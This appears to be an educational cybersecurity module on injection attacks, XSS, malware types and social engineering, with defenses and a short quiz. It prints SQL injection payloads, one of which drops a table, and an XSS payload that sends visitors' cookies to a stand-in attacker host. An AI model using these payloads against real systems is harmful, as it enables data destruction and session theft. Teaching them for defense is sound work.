# Types of cyber attacks

Knowing attack techniques is essential to know how to defend. This module covers the most widespread and dangerous attacks.

## Injections: OWASP #1

Injection attacks happen when unvalidated data is sent to an interpreter (SQL, shell, LDAP). The best known is SQL injection.

### SQL injection

A vulnerable query builds SQL dynamically from unvalidated user data.

```sql
-- Vulnerable query (PHP)
SELECT * FROM users WHERE username = '$_GET[user]'

-- Malicious payload
username = ' OR '1'='1
-- Result: returns ALL users

-- Destructive payload
username = '; DROP TABLE users; --
```

### Defense: prepared statements

The only effective defense is to never concatenate user data into an SQL query.

```php
// PHP PDO — prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
// The parameter is treated as DATA, never as SQL
```

### Other types of injection

- **Command injection**: injecting shell commands through forms
- **LDAP injection**: manipulating directory queries
- **XPath injection**: targeting XML databases

---

## XSS: Cross-Site Scripting

XSS allows malicious JavaScript to be injected into a web page viewed by other users. It is the main vector for session theft and phishing.

### Reflected XSS

The malicious script is included in the URL and runs immediately.

```html
https://site.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Stored (persistent) XSS

The script is stored in the database and runs for every visitor. The most dangerous kind.

### XSS defenses

```javascript
// ✅ Safe — textContent encodes automatically
element.textContent = userInput;

// ❌ Dangerous — innerHTML runs scripts
element.innerHTML = userInput;
```

Protective HTTP headers:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## Malware: a complete taxonomy

### Ransomware

Encrypts the victim's files and demands a ransom for the decryption key. Examples: WannaCry (2017), LockBit, REvil. Main vectors: phishing, exposed RDP, unpatched vulnerabilities.

### RAT: Remote Access Trojan

Gives the attacker full remote control of the machine: keylogger, screenshots, webcam access. Examples: NjRAT, AsyncRAT, DarkComet.

### Worm

Spreads automatically across a network without human intervention, exploiting network vulnerabilities. Examples: Conficker; WannaCry spread through EternalBlue.

### Rootkit

Hides at the operating system or kernel level, making detection extremely difficult for ordinary antivirus software.

### Botnet

A network of infected machines controlled by a C2 (Command and Control) server. Used for distributed DDoS attacks, sending spam and mining cryptocurrency.

---

## Social engineering

Most successful attacks involve a social engineering component. Humans are still the weakest link.

### Phishing

A fraudulent email imitating a trusted organization to steal credentials or install malware. Sent in bulk.

### Spear phishing

A targeted, personalized version of phishing. The attacker researches the victim to make the email credible. Its success rate is much higher.

### Vishing and smishing

The same techniques by phone (vishing) or SMS (smishing). Increasingly used to bypass email filters.

### Pretexting

The attacker creates a believable fictional scenario to manipulate the victim. Example: pretending to be technical support.

### Protecting yourself from social engineering

Awareness and user training are the best defenses:

- Systematically verify the identity of whoever contacts you
- Never click links in urgent emails
- Call the organization directly to verify
- Enable MFA on all critical accounts

---

## Quiz: attacks

```quiz
What is the most effective defense against SQL injection?
- [ ] Removing quotes from user input
- [x] Prepared statements with bound parameters
- [ ] Hiding error messages
> With prepared statements, user input is always treated as data and never as SQL.
```

```quiz
A comment containing a script is saved in the database and runs in every visitor's browser. What is this attack?
- [ ] Reflected XSS
- [x] Stored XSS
- [ ] CSRF
> The payload is stored on the server and served to everyone, which makes stored XSS the most dangerous variant.
```

```quiz
Which malware spreads automatically across a network without human action?
- [ ] A rootkit
- [ ] A RAT
- [x] A worm
> A worm exploits network vulnerabilities to copy itself from machine to machine, as WannaCry did.
```

```quiz
Which cookie attribute prevents JavaScript from reading a session cookie, limiting the damage of an XSS attack?
- [ ] `Secure`
- [ ] `SameSite=Strict`
- [x] `HttpOnly`
- [ ] `Path=/`
> `HttpOnly` hides the cookie from scripts, so an injected script cannot send it to an attacker. `Secure` only restricts it to HTTPS.
```
